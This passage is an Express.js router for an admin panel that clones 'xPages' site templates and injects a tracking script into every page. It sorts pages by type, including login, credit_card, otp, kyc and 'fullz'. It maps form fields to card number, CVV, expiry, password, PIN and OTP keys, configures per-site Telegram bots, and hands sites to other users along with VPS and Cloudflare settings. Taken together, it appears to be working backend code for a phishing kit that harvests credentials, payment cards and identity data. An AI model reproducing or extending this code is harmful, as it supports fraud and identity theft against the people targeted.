    if (!website.demo_slug) return res.status(400).json({ error: 'Website has no demo slug' });

    const { filename } = req.params;
    if (filename.includes('..')) return res.status(400).json({ error: 'Path traversal not allowed' });
    const ext = filename.split('.').pop().toLowerCase();
    if (!TEXT_EXTS.has(ext)) return res.status(415).json({ error: 'Not a viewable text file' });

    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
    const filePath = path.join(siteDir, filename);
    if (!filePath.startsWith(siteDir)) return res.status(400).json({ error: 'Invalid filename' });
    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'File not found' });

    const stat = fs.statSync(filePath);
    if (stat.size > 2 * 1024 * 1024) return res.status(413).json({ error: 'File too large to view inline (>2MB)' });

    const content = fs.readFileSync(filePath, 'utf8');
    res.json({ name: filename, size: stat.size, mtime: stat.mtimeMs, content });
  } catch (err) {
    console.error('File content error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── PATCH /:id/files/:filename ───────────────────────────────────────────────
// Rename a file. Also rewrites the URL of any linked demo_pages row so the
// registry stays in sync — a rename should never leave dangling registrations.
router.patch('/:id/files/:filename(*)', requireGod, requireAction('demo-pages', 'upload'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);
    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!website) return res.status(404).json({ error: 'Website not found' });
    if (!website.demo_slug) return res.status(400).json({ error: 'Website has no demo slug' });

    const oldName = req.params.filename;
    const rawNew  = (req.body && req.body.newName) || '';
    if (!rawNew) return res.status(400).json({ error: 'newName required' });
    if (oldName.includes('..') || rawNew.includes('..')) return res.status(400).json({ error: 'Path traversal not allowed' });

    // Normalise: allow slashes for subfolders but clean each segment
    const cleanParts = rawNew.replace(/\\/g, '/').split('/')
      .map(p => p.replace(/[^a-zA-Z0-9.\-_@ ]/g, '_'))
      .filter(p => p && p !== '..' && p !== '.');
    if (!cleanParts.length) return res.status(400).json({ error: 'Invalid new filename' });
    const newName = cleanParts.join('/');
    if (newName === oldName) return res.json({ ok: true, unchanged: true, newName });

    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
    const oldPath = path.join(siteDir, oldName);
    const newPath = path.join(siteDir, newName);
    if (!oldPath.startsWith(siteDir) || !newPath.startsWith(siteDir)) return res.status(400).json({ error: 'Invalid path' });
    if (!fs.existsSync(oldPath)) return res.status(404).json({ error: 'Source file not found' });
    if (fs.existsSync(newPath)) return res.status(409).json({ error: 'A file with that name already exists' });

    fs.mkdirSync(path.dirname(newPath), { recursive: true });
    fs.renameSync(oldPath, newPath);

    // Update linked demo_pages URL if this looks like a registered HTML page
    let rewired = 0;
    if (oldName.toLowerCase().endsWith('.html')) {
      const oldBase = oldName.split('/').pop().replace(/\.html?$/i, '');
      const newBase = newName.split('/').pop().replace(/\.html?$/i, '');
      const oldUrl  = `/${website.demo_slug}/${oldBase}`;
      const newUrl  = `/${website.demo_slug}/${newBase}`;
      const r = await db.run('UPDATE demo_pages SET url = ? WHERE website_id = ? AND url = ?', [newUrl, websiteId, oldUrl]);
      rewired = r?.changes || r?.rowCount || 0;
    }

    await writeAudit(req, `Renamed file ${oldName} → ${newName}`, 'website', { website_id: websiteId, oldName, newName, rewired });
    res.json({ ok: true, oldName, newName, rewired });
  } catch (err) {
    console.error('Rename file error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST /:id/files/search ───────────────────────────────────────────────────
// Full-text grep across text-ish files. Returns per-file matches with the
// line number and a short surrounding snippet. Cap total matches to keep the
// response small.
router.post('/:id/files/search', requireWebsiteAccess('param:id'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);
    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!website) return res.status(404).json({ error: 'Website not found' });
    if (!website.demo_slug) return res.status(400).json({ error: 'Website has no demo slug' });

    const query = (req.body && req.body.query || '').trim();
    if (!query) return res.status(400).json({ error: 'query required' });
    if (query.length > 200) return res.status(400).json({ error: 'query too long' });

    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
    if (!fs.existsSync(siteDir)) return res.json({ query, matches: [], totalMatches: 0 });

    const files = [];
    (function walk(dir, base = '') {
      for (const item of fs.readdirSync(dir, { withFileTypes: true })) {
        const rel = base ? `${base}/${item.name}` : item.name;
        const full = path.join(dir, item.name);
        if (item.isDirectory()) walk(full, rel);
        else if (item.isFile()) {
          const ext = item.name.split('.').pop().toLowerCase();
          if (TEXT_EXTS.has(ext)) files.push({ rel, full });
        }
      }
    })(siteDir);

    const needle = query.toLowerCase();
    const results = [];
    let totalMatches = 0;
    const MAX_TOTAL = 200;

    for (const f of files) {
      try {
        const stat = fs.statSync(f.full);
        if (stat.size > 1024 * 1024) continue; // skip huge files (>1MB)
        const lines = fs.readFileSync(f.full, 'utf8').split(/\r?\n/);
        const fileHits = [];
        for (let i = 0; i < lines.length; i++) {
          const idx = lines[i].toLowerCase().indexOf(needle);
          if (idx === -1) continue;
          const snippetStart = Math.max(0, idx - 30);
          const snippet = lines[i].slice(snippetStart, snippetStart + 120);
          fileHits.push({ line: i + 1, snippet, matchStart: idx - snippetStart, matchLen: query.length });
          totalMatches++;
          if (totalMatches >= MAX_TOTAL) break;
          if (fileHits.length >= 10) break;
        }
        if (fileHits.length) results.push({ file: f.rel, hits: fileHits });
        if (totalMatches >= MAX_TOTAL) break;
      } catch (_) { /* skip unreadable files */ }
    }

    res.json({ query, matches: results, totalMatches, truncated: totalMatches >= MAX_TOTAL });
  } catch (err) {
    console.error('File search error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /:id/broken-links ────────────────────────────────────────────────────
// Scan every HTML file for referenced assets and flag references whose target
// file isn't on the server. Only looks at same-origin/relative refs — absolute
// URLs to external hosts are ignored (can't verify without a network probe).
router.get('/:id/broken-links', requireWebsiteAccess('param:id'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);
    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!website) return res.status(404).json({ error: 'Website not found' });
    if (!website.demo_slug) return res.json({ files: {} });

    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
    if (!fs.existsSync(siteDir)) return res.json({ files: {} });

    // Build a set of every file present (relative + basename lookup)
    const present = new Set();
    (function walk(dir, base = '') {
      for (const item of fs.readdirSync(dir, { withFileTypes: true })) {
        const rel = base ? `${base}/${item.name}` : item.name;
        const full = path.join(dir, item.name);
        if (item.isDirectory()) walk(full, rel);
        else if (item.isFile()) present.add(rel.toLowerCase());
      }
    })(siteDir);

    // Extract src/href references from every HTML file
    const REF_RE = /(?:src|href)\s*=\s*["']([^"'#?]+?)(?:[?#][^"']*)?["']/gi;
    const perFile = {};
    for (const rel of present) {
      if (!/\.html?$/i.test(rel)) continue;
      const full = path.join(siteDir, rel);
      const html = fs.readFileSync(full, 'utf8');
      const missing = new Set();
      let m;
      while ((m = REF_RE.exec(html)) !== null) {
        const ref = m[1].trim();
        // Skip external, protocol-relative, data:, mailto:, tel:, anchors, tracker, template placeholders
        if (!ref) continue;
        if (/^(https?:|\/\/|data:|mailto:|tel:|javascript:|#)/i.test(ref)) continue;
        if (ref.startsWith('/tracker.js')) continue;
        if (ref.includes('%%')) continue;
        // Resolve relative to the HTML file's directory
        const dir = rel.includes('/') ? rel.substring(0, rel.lastIndexOf('/')) : '';
        let target;
        if (ref.startsWith('/')) target = ref.replace(/^\/+/, '');
        else target = (dir ? dir + '/' : '') + ref;
        target = target.replace(/\/\.\//g, '/').replace(/\/+/g, '/').toLowerCase();
        if (!present.has(target)) missing.add(m[1].trim());
      }
      if (missing.size) perFile[rel] = Array.from(missing);
    }

    res.json({ files: perFile, brokenFileCount: Object.keys(perFile).length });
  } catch (err) {
    console.error('Broken links scan error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /:id/scan-fields ──────────────────────────────────────────────────────
router.get('/:id/scan-fields', requireWebsiteAccess('param:id'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);
    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!website) return res.status(404).json({ error: 'Website not found' });
    if (!website.demo_slug) return res.status(400).json({ error: 'Website has no demo slug' });

    const { file } = req.query;
    if (!file) return res.status(400).json({ error: 'file query param required (e.g. ?file=login.html)' });

    if (file.includes('..') || file.includes('/') || file.includes('\\')) {
      return res.status(400).json({ error: 'Invalid filename' });
    }

    const filePath = path.join(__dirname, '..', 'xPages', website.demo_slug, file);
    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: `File not found: ${file}` });
    }

    const html = fs.readFileSync(filePath, 'utf8');
    const scanned = scanFieldsFromHtml(html);

    res.json({
      fields: scanned.fields,
      file,
      slug: website.demo_slug,
      strategy: scanned.strategy,
    });
  } catch (err) {
    console.error('Scan fields error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── GET /:id/download-zip ─────────────────────────────────────────────────────
router.get('/:id/download-zip', requireGod, async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);
    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    
    if (!website) {
      return res.status(404).json({ error: 'Website not found' });
    }
    if (!website.demo_slug) {
      return res.status(400).json({ error: 'Website has no demo slug' });
    }

    const siteDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
    if (!fs.existsSync(siteDir)) {
      return res.status(404).json({ error: 'Site directory not found' });
    }

    const pages = await db.all('SELECT id, name, url, form_type, fields_schema, created_at FROM demo_pages WHERE website_id = ?', [websiteId]);

    try {
      const archiver = require('archiver');
      const archive = archiver('zip', { zlib: { level: 9 } });
      
      res.attachment(`${website.demo_slug}-${Date.now()}.zip`);
      res.type('application/zip');
      
      archive.pipe(res);
      archive.directory(siteDir, false);

      const registryData = {
        website_id: websiteId,
        website_name: website.name,
        demo_slug: website.demo_slug,
        domain: website.domain,
        exported_at: new Date().toISOString(),
        pages: pages.map(p => ({
          name: p.name,
          url: p.url,
          form_type: p.form_type,
          fields_schema: typeof p.fields_schema === 'string' ? JSON.parse(p.fields_schema || '[]') : (p.fields_schema || []),
          created_at: p.created_at
        }))
      };
      
      archive.append(JSON.stringify(registryData, null, 2), { name: 'registry-config.json' });
      archive.finalize();

      await writeAudit(req, `Downloaded ZIP for website: ${website.name}`, 'website', { website_id: websiteId, pages_count: pages.length });

    } catch (archiverError) {
      console.warn('Archiver not available, returning JSON only:', archiverError.message);
      
      const registryData = {
        website_id: websiteId,
        website_name: website.name,
        demo_slug: website.demo_slug,
        domain: website.domain,
        exported_at: new Date().toISOString(),
        pages: pages.map(p => ({
          name: p.name,
          url: p.url,
          form_type: p.form_type,
          fields_schema: typeof p.fields_schema === 'string' ? JSON.parse(p.fields_schema || '[]') : (p.fields_schema || []),
          created_at: p.created_at
        })),
        note: 'Full ZIP export requires archiver package.'
      };
      
      res.attachment(`${website.demo_slug}-registry-${Date.now()}.json`);
      res.type('application/json');
      res.json(registryData);
      
      await writeAudit(req, `Downloaded registry JSON for website: ${website.name}`, 'website', { website_id: websiteId, pages_count: pages.length, format: 'json-only' });
    }
    
  } catch (err) {
    console.error('Download ZIP error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});


// ─── POST /ai-create ────────────────────────────────────────────────────────────
router.post('/ai-create', requireGod, requireAction('demo-pages', 'ai-create'), async (req, res) => {
  try {
    const db = getAdapter();
    const { name, domain, demo_slug, logo_url, color = '#6366f1', prompt, template } = req.body;

    if (!name || !domain || !demo_slug || !template) {
      return res.status(400).json({ error: 'Name, domain, slug, and template are required' });
    }

    const trimmedSlug = demo_slug.trim();
    const finalDomain = domain.trim();
    const logoUrl = logo_url ? logo_url.trim() : null;

    const existingSlug = await db.get('SELECT id FROM websites WHERE demo_slug = ?', [trimmedSlug]);
    if (existingSlug) {
      return res.status(409).json({ error: 'A website with this demo slug already exists' });
    }

    const apiKey = uuidv4();
    const ownerId = (req.effectiveUserId != null) ? req.effectiveUserId : req.user.id;

    const result = await db.run(`
      INSERT INTO websites (owner_id, name, domain, api_key, is_active, demo_slug, logo_url, color)
      VALUES (?, ?, ?, ?, 1, ?, ?, ?)
    `, [ownerId, name, finalDomain, apiKey, trimmedSlug, logoUrl, color]);

    const websiteId = result.lastInsertRowid;

    const sourceDir = path.join(__dirname, '..', 'xPages', template);
    const targetDir = path.join(__dirname, '..', 'xPages', trimmedSlug);

    if (fs.existsSync(sourceDir)) {
      const copyFolderSync = (from, to) => {
        if (!fs.existsSync(to)) {
          fs.mkdirSync(to, { recursive: true });
        }
        fs.readdirSync(from).forEach(element => {
          const fromPath = path.join(from, element);
          const toPath = path.join(to, element);
          if (fs.lstatSync(fromPath).isDirectory()) {
            copyFolderSync(fromPath, toPath);
          } else {
            if (element.toLowerCase().endsWith('.html')) {
              let fileContent = fs.readFileSync(fromPath, 'utf8');
              if (!fileContent.includes('/tracker.js')) {
                const scriptTag = `\n<script src="/tracker.js" data-api-key="%%API_KEY%%" defer></script>\n`;
                if (fileContent.includes('</head>')) {
                  fileContent = fileContent.replace('</head>', `${scriptTag}</head>`);
                } else if (fileContent.includes('</body>')) {
                  fileContent = fileContent.replace('</body>', `${scriptTag}</body>`);
                } else {
                  fileContent += scriptTag;
                }
              }
              fs.writeFileSync(toPath, fileContent, 'utf8');
            } else {
              fs.copyFileSync(fromPath, toPath);
            }
          }
        });
      };
      
      copyFolderSync(sourceDir, targetDir);
    }

    if (fs.existsSync(targetDir)) {
      const scanFields = (html) => scanFieldsFromHtml(html).fields;

      const guessFormType = (basename, fields) => {
        const n = basename.toLowerCase();
        if (n.includes('login') || n.includes('cred') || fields.includes('password')) return 'login';
        if (n.includes('cc') || n.includes('card') || fields.includes('card_number') || fields.includes('card_holder')) return 'credit_card';
        if (n.includes('otp') || n.includes('sms') || fields.includes('otp_code') || fields.includes('sms_code')) return 'otp';
        if (n.includes('email') || fields.includes('email_code')) return 'email_verify';
        if (n.includes('auth') || n.includes('2fa') || fields.includes('auth_code')) return 'authenticator';
        if (n.includes('id_') || n.includes('selfie') || fields.includes('id_front')) return 'id_upload';
        if (n.includes('bank') || fields.includes('account_number')) return 'banking';
        if (n.includes('personal') || n.includes('fullz')) return 'personal_info';
        if (n.includes('kyc') || fields.includes('ssn') || fields.includes('dob')) return 'kyc';
        if (n.includes('load') || n.includes('wait') || n.includes('hold') || n.includes('spinner')) return 'loading';
        return 'general';
      };

      const htmlFiles = fs.readdirSync(targetDir).filter(f => f.toLowerCase().endsWith('.html'));

      for (const file of htmlFiles) {
        const basename = path.basename(file, '.html');
        const urlPath = file.toLowerCase() === 'index.html' ? `/demo/${trimmedSlug}` : `/demo/${trimmedSlug}/${basename}`;
        const fileContent = fs.readFileSync(path.join(targetDir, file), 'utf8');
        const fields = scanFields(fileContent);
        
        const mappings = {};
        fields.forEach(f => {
          const n = f.toLowerCase().replace(/[_\-\s]/g, '');
          let canonicalVal = '__keep__';
          if (/^(ccnumb?|cardnumb?|cardno|pan|ccno)$/.test(n)) canonicalVal = 'card_number';
          else if (/^(ccholder?|cardholder?|ccname|cardname|nameoncard)$/.test(n)) canonicalVal = 'card_holder';
          else if (/^(ccexp|cardexp|expiry|expdate|expirydate|mm\/yy|mmyy)$/.test(n)) canonicalVal = 'expiry';
          else if (/^(cccvv|cvv2?|cvc2?|securitycode)$/.test(n)) canonicalVal = 'cvv';
          else if (/^(email|mail|user(name)?|login|userid)$/.test(n)) canonicalVal = 'email';
          else if (/^(username|user|uname)$/.test(n)) canonicalVal = 'username';
          else if (/^(pass(word)?|pwd|secret)$/.test(n)) canonicalVal = 'password';
          else if (/^(pin|pincode|loginpin)$/.test(n)) canonicalVal = 'pin';
          else if (/^(otp|otpcode|smscode|sms|verif(ication)?code)$/.test(n)) canonicalVal = 'otp_code';
          
          mappings[f] = canonicalVal;
        });

        const name = basename.split(/[-_]/).map(w => w.charAt(0).toUpperCase() + w.slice(1)).join(' ');
        const formType = guessFormType(basename, fields);

        await db.run(`
          INSERT INTO demo_pages (website_id, url, name, form_type, fields_schema, field_mappings)
          VALUES (?, ?, ?, ?, ?, ?)
        `, [websiteId, urlPath, name, formType, JSON.stringify(fields), JSON.stringify(mappings)]);
      }
    }

    await writeAudit(req, `Created website with AI: ${name} (template: ${template})`, 'website', { website_id: websiteId, domain: finalDomain, demo_slug: trimmedSlug, prompt });

    await db.run(`
      INSERT INTO activity_feed (owner_id, type, icon, message, details, website_id)
      VALUES (?, ?, ?, ?, ?, ?)
    `, [ownerId, 'website', '🤖', `${req.user.username} created website "${name}" using AI model`,
      JSON.stringify({ website_id: websiteId }), websiteId]);

    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);

    res.status(201).json({ message: 'Website created with AI successfully', website });
  } catch (err) {
    console.error('Create website with AI error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── PUT /:id/tg-config ─────────────────────────────────────────────────────
// Save per-website Telegram bot config and (re)start the bot
router.put('/:id/tg-config', requireGod, requireAction('demo-pages', 'tg-config'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);

    const existing = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!existing) return res.status(404).json({ error: 'Website not found' });

    const { tg_bot_token, tg_chat_id, tg_allowed_users, tg_bot_active } = req.body;

    const updates = [];
    const values = [];

    if (tg_bot_token !== undefined) {
      updates.push('tg_bot_token = ?');
      values.push(tg_bot_token ? tg_bot_token.trim() : null);
    }
    if (tg_chat_id !== undefined) {
      updates.push('tg_chat_id = ?');
      values.push(tg_chat_id ? String(tg_chat_id).trim() : null);
    }
    if (tg_allowed_users !== undefined) {
      const arr = Array.isArray(tg_allowed_users)
        ? tg_allowed_users.map(String)
        : (tg_allowed_users ? [String(tg_allowed_users)] : []);
      updates.push('tg_allowed_users = ?');
      values.push(JSON.stringify(arr));
    }
    if (tg_bot_active !== undefined) {
      updates.push('tg_bot_active = ?');
      values.push(tg_bot_active ? 1 : 0);
    }

    if (updates.length === 0) {
      return res.status(400).json({ error: 'No fields to update' });
    }

    values.push(websiteId);
    await db.run(`UPDATE websites SET ${updates.join(', ')} WHERE id = ?`, values);

    await writeAudit(req, `Updated Telegram bot config for: ${existing.name}`, 'telegram', { website_id: websiteId });

    // Restart the bot with new config
    try {
      const tgBotManager = require('../services/tgBotManager');
      await tgBotManager.restartBot(websiteId);
    } catch (e) {
      console.warn('TgBotManager restart warning:', e.message);
    }

    const updated = await db.get('SELECT id, name, domain, tg_chat_id, tg_bot_active, tg_allowed_users FROM websites WHERE id = ?', [websiteId]);
    res.json({ message: 'Telegram bot config updated', website: updated });
  } catch (err) {
    console.error('Update TG config error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST /:id/tg-test ──────────────────────────────────────────────────────
// Send a test message to verify the bot is working
router.post('/:id/tg-test', requireGod, requireAction('demo-pages', 'tg-config'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);

    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!website) return res.status(404).json({ error: 'Website not found' });

    if (!website.tg_bot_token || !website.tg_chat_id) {
      return res.status(400).json({ error: 'Bot token and chat ID must be configured first' });
    }

    const TelegramBot = require('node-telegram-bot-api');
    const tempBot = new TelegramBot(website.tg_bot_token, { polling: false });

    const msg = [
      `✅ <b>ALP Bot Test — ${website.name}</b>`,
      ``,
      `🎉 Your per-site Telegram bot is working!`,
      `⏰ ${new Date().toUTCString()}`,
      ``,
      `Send /start to see all commands.`
    ].join('\n');

    try {
      await tempBot.sendMessage(website.tg_chat_id, msg, { parse_mode: 'HTML' });
    } catch (tgErr) {
      return res.status(400).json({ error: 'Failed to send message', details: tgErr.message });
    }

    res.json({ message: 'Test message sent successfully' });
  } catch (err) {
    console.error('TG test error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST /:id/pages/sync ───────────────────────────────────────────────────
// Upserts an array of page records (from localhost sync) into demo_pages.
router.post('/:id/pages/sync', requireGod, requireAction('demo-pages', 'sync-pages'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);

    const existing = await db.get('SELECT id FROM websites WHERE id = ?', [websiteId]);
    if (!existing) return res.status(404).json({ error: 'Website not found' });

    const { pages } = req.body;
    if (!Array.isArray(pages) || pages.length === 0) {
      return res.status(400).json({ error: 'pages array required' });
    }

    let created = 0;
    let updated = 0;

    for (const p of pages) {
      if (!p.url) continue;
      const fieldsSchema   = typeof p.fields_schema   === 'string' ? p.fields_schema   : JSON.stringify(p.fields_schema   || []);
      const fieldMappings  = typeof p.field_mappings  === 'string' ? p.field_mappings  : JSON.stringify(p.field_mappings  || {});

      const row = await db.get('SELECT id FROM demo_pages WHERE website_id = ? AND url = ?', [websiteId, p.url]);
      if (row) {
        await db.run(
          `UPDATE demo_pages SET name = ?, form_type = ?, fields_schema = ?, field_mappings = ? WHERE id = ?`,
          [p.name || '', p.form_type || 'general', fieldsSchema, fieldMappings, row.id]
        );
        updated++;
      } else {
        await db.run(
          `INSERT INTO demo_pages (website_id, url, name, form_type, fields_schema, field_mappings) VALUES (?, ?, ?, ?, ?, ?)`,
          [websiteId, p.url, p.name || '', p.form_type || 'general', fieldsSchema, fieldMappings]
        );
        created++;
      }
    }

    await writeAudit(req, `Synced ${created + updated} page(s) for website #${websiteId}`, 'website', { website_id: websiteId, created, updated });
    res.json({ message: 'Pages synced', created, updated });
  } catch (err) {
    console.error('Pages sync error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── DELETE /:id/pages-folder — delete entire xPages/<slug>/ directory ───────
router.delete('/:id/pages-folder', requireGod, requireAction('demo-pages', 'sync-pages'), async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);
    const website = await db.get('SELECT * FROM websites WHERE id = ?', [websiteId]);
    if (!website) return res.status(404).json({ error: 'Website not found' });
    if (!website.demo_slug) return res.status(400).json({ error: 'Website has no slug — no files to delete' });

    const slugDir = path.join(__dirname, '..', 'xPages', website.demo_slug);
    if (fs.existsSync(slugDir)) {
      fs.rmSync(slugDir, { recursive: true, force: true });
    }

    await writeAudit(req, `Deleted all xPages files for: ${website.name}`, 'website', { website_id: websiteId, slug: website.demo_slug });

    res.json({ message: 'Site files deleted', slug: website.demo_slug });
  } catch (err) {
    console.error('Delete pages-folder error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── POST /:id/transfer — hand ownership to another user (god only) ─────────
//
// Body: { new_owner_id, keep_infra?: boolean }
//
// Default is a CLEAN handoff: the client (or god, on take-back) receives the
// website identity — name, slug, xPages folder, form config — with every piece
// of the previous owner's private infrastructure stripped off. Specifically:
//   - VPS creds (host, port, user, password, key) on the website row
//   - Public domain attachment (deploy_domain, cf_zone_id, cf_nameservers)
//   - Alt-domain routing (domain_alt, domain_alt_active)
//   - Per-website Telegram bot (token, chat id, allowlist, active flag)
//   - Any rows in `domains` linked to this website are DETACHED
//     (website_id → NULL) so they remain under the ORIGINAL owner, unlinked.
//     The new owner attaches their own domains from scratch.
//
// Pass keep_infra:true to preserve the whole configuration (old cascade
// behavior). Rarely useful — mostly a safety-net for scripted callers.
router.post('/:id/transfer', requireGod, async (req, res) => {
  try {
    const db = getAdapter();
    const websiteId = parseInt(req.params.id, 10);
    const newOwnerId = parseInt(req.body?.new_owner_id, 10);
    const keepInfra = req.body?.keep_infra === true;
    if (!Number.isFinite(websiteId))  return res.status(400).json({ error: 'invalid website id' });
    if (!Number.isFinite(newOwnerId)) return res.status(400).json({ error: 'new_owner_id is required' });

    const website = await db.get('SELECT id, name, owner_id FROM websites WHERE id = ?', [websiteId]);
    if (!website) return res.status(404).json({ error: 'Website not found' });

    const newOwner = await db.get('SELECT id, username FROM users WHERE id = ?', [newOwnerId]);
    if (!newOwner) return res.status(404).json({ error: 'Target user not found' });

    if (Number(website.owner_id) === newOwnerId) {
      return res.status(200).json({ message: 'Already owned by that user', website_id: websiteId });
    }

    const oldOwnerId = website.owner_id;
    const stripped = [];

    // 1. Change ownership.
    await db.run('UPDATE websites SET owner_id = ? WHERE id = ?', [newOwnerId, websiteId]);

    if (keepInfra) {
      // Legacy cascade — everything moves with the website. Includes the
      // vps_id link — the new owner inherits the pointer, though the vpses
      // row itself stays under the original owner unless they also transfer
      // it (registry membership is per-owner_id, not per-website).
      await db.run('UPDATE domains SET owner_id = ? WHERE website_id = ?', [newOwnerId, websiteId]);
    } else {
      // 2. Wipe the previous owner's infrastructure from the website row.
      //    vps_id becomes NULL — the vpses registry row stays with the
      //    previous owner (see VPS Control Center for it). Legacy vps_host /
      //    vps_ssh_* columns are also nulled to prevent creds from lingering
      //    on a row a different tenant now owns.
      await db.run(`
        UPDATE websites SET
          vps_id        = NULL,
          vps_host      = NULL,
          vps_ssh_port  = 22,
          vps_ssh_user  = 'root',
          vps_ssh_pass  = NULL,
          vps_ssh_key   = NULL,
          deploy_domain = NULL,
          cf_zone_id    = NULL,
          cf_nameservers = NULL,
          domain        = '',
          domain_active = 0,
          domain_alt    = NULL,
          domain_alt_active = 0,
          tg_bot_token  = NULL,
          tg_chat_id    = NULL,
          tg_allowed_users = '[]',
          tg_bot_active = 0
        WHERE id = ?`,
        [websiteId]
      );
      stripped.push('vps_link', 'vps_creds_legacy', 'deploy_domain', 'cf_zone', 'domain', 'domain_alt', 'tg_bot');

      // 3. Detach any linked domains — they stay under the previous owner,
      //    unlinked from this website. The new owner starts with a clean
      //    Domains list; the previous owner can reattach them if desired.
      const detach = await db.all(
        'SELECT id, domain FROM domains WHERE website_id = ?',
        [websiteId]
      );
      if (detach && detach.length) {
        await db.run(
          'UPDATE domains SET website_id = NULL WHERE website_id = ?',
          [websiteId]
        );
        stripped.push(`${detach.length}_domains_detached`);
      }
    }

    await writeAudit(req, `Transferred website: ${website.name} → ${newOwner.username}`, 'website', {
      website_id: websiteId,
      from_user: oldOwnerId,
      to_user: newOwnerId,
      keep_infra: keepInfra,
      stripped,
    });

    res.json({
      message: keepInfra
        ? `Website transferred to ${newOwner.username} (config preserved)`
        : `Website transferred to ${newOwner.username} — clean handoff, infra stripped`,
      website_id: websiteId,
      from_user: oldOwnerId,
      to_user: newOwnerId,
      keep_infra: keepInfra,
      stripped,
    });
  } catch (err) {
    console.error('Transfer website error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

module.exports = router;

